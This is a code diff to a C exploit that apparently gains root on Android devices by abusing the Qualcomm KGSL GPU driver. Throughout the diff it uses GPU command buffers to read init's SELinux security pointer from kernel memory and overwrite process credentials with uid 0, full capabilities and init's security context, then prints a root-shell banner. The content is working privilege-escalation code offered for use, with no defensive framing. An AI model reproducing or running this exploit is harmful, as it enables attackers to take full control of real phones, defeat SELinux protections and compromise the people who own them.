@@ -465,6 +465,7 @@ int main(int argc, char **argv) {
     int cred_offs[32];
     int n_cred = 0;
     int sec_offset = -1;
+    uint64_t init_security_ptr = 0;
 
     uint32_t *cmd;
     int dw;
@@ -520,17 +521,36 @@ int main(int argc, char **argv) {
                 } else {
                     printf("  found security pointer offset 0x%x\n", sec_offset);
                 }
+
+                // Read init's security pointer
+                memset(ib_m, 0, 0x10000);
+                cmd = (uint32_t *)ib_m;
+                dw = 0;
+                cmd[dw++] = cp_type7(CP_NOP, 0);
+                uint32_t dl, dh, sl, sh;
+                split64(dst_ga, &dl, &dh);
+                split64(init_cred_addr + sec_offset, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+                cmd[dw++] = cp_type7(CP_NOP, 0);
+                __sync_synchronize();
+                if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
+                    wait_timestamp(kgsl_fd, ctx_id, ts);
+                    init_security_ptr = *(uint64_t *)dst_m;
+                    printf("  init_security_ptr = 0x%lx\n", (unsigned long)init_security_ptr);
+                }
             }
         }
     }
     printf("\n[*] Phase 7 complete: found %d cred pages\n", n_cred);
 
-    if (n_cred == 0) {
-        printf("[-] No cred pages found, aborting\n");
+    if (n_cred == 0 || init_security_ptr == 0) {
+        printf("[-] No cred pages or init security pointer found, aborting\n");
         return 1;
     }
 
-    printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full, security=kernel SID)\n");
+    printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full, security=init's security)\n");
     for (int p = 0; p < n_cred && p < 32; p++) {
         uint64_t cbase = cred_pages[p] + cred_offs[p];
         cmd = (uint32_t *)ib_m;
@@ -556,14 +576,13 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
         }
 
-        if (sec_offset >= 0) {
+        if (sec_offset >= 0 && init_security_ptr != 0) {
             uint64_t sec_addr_base = cbase + sec_offset;
-            uint64_t fake_sec_addr = cred_pages[p] + 0xFB0;
             uint32_t al, ah;
             split64(sec_addr_base, &al, &ah);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
             cmd[dw++] = al; cmd[dw++] = ah;
-            split64(fake_sec_addr, &al, &ah);
+            split64(init_security_ptr, &al, &ah);
             cmd[dw++] = al; cmd[dw++] = ah;
         }
 
@@ -571,11 +590,6 @@ int main(int argc, char **argv) {
         __sync_synchronize();
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
-    }
-
-    for (int p = 0; p < n_cred; p++) {
-        uint32_t *page = (uint32_t *)cred_pages[p];
-        page[0xFB0 / 4] = 1;
     }
 
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
@@ -779,7 +793,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
         while (waitpid(-1, NULL, WNOHANG) > 0);
-        printf("\n  # ROOT SHELL (uid=0, SELinux kernel context) - type exit to quit\n  # ");
+        printf("\n  # ROOT SHELL (uid=0, SELinux init context) - type exit to quit\n  # ");
         fflush(stdout);
         waitpid(winner, NULL, 0);
         printf("[-] Root shell exited\n");
